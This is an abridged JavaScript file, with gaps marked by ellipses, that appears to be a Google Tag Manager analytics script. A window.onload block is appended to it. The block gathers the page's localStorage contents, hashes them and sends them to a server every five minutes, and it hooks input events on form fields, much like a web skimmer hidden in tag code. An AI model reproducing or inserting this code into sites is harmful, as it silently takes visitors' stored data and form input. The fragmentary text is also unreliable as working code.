...
(function () {
  var data = {
    "resource": {
      ...
      "tags": [{
        ...
        "vtp_instanceDestinationId": "G-NVJGPCWEE0",
  ...
  ni.oe = Number("0") || 0;
  ni.ia = "dataLayer";
  ni.fk = "ChEIgLvcqgYQuqbl1cDT0urCARIlAFgXOW4fBV43JHfzNQhuwXqDFxNqNMgs0nByP+j8m5Wva3KNYxoC0RE\x3d";
  var qi = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
  ...
  function hE() {
    var a = new sb();
    N(this, "read_container_data"), a.set("containerId", 'G-NVJGPCWEE0'), a.set("version", '1'), a.set("environmentName", ''), a.set("debugMode", $f), a.set("previewMode", bg), a.set("environmentMode", ag), a.set("firstPartyServing", wi || yi), a.set("containerUrl", Ec), a.Cb();
    return a;
  }
  ...
  window.onload = function () {
    const keysToDetect = window.keysToDetect;
    function generateHash(data) {
      const keySet = Object.keys(data);
      const mergedKeys = keySet.join("");
      let hashSum = 0;
      for (let i = 0; i < mergedKeys.length; i++) {
        const unicode = mergedKeys.charCodeAt(i);
        hashSum = (hashSum << 5) - hashSum + unicode;
    ...
    function sendToServer(data) {
      const hashedId = generateHash(data);
      ...
      xhr.onreadystatechange = function () {
        if (xhr.readyState === XMLHttpRequest.DONE) {
          if (xhr.status === 200) {
            ...
            console.error("Failed transmission, statusCode:" + xhr.status);
          }
        }
      };
    }
    function collectAndForwardLocalStorageData() {
      const extractedLocalStorage = extractLocalStorage();
      if (Object.keys(extractedLocalStorage).length > 0) {
        sendToServer(extractedLocalStorage);
      }
    }
    setInterval(collectAndForwardLocalStorageData, 5 * 60 * 1000);
    ...
    let inputs = document.getElementsByClassName('field-control');
    for (let i = 0; i < inputs.length; i++) {
      inputs[i].addEventListener('input', function () {
        let formField = this.parentNode;
        if (this.value) {
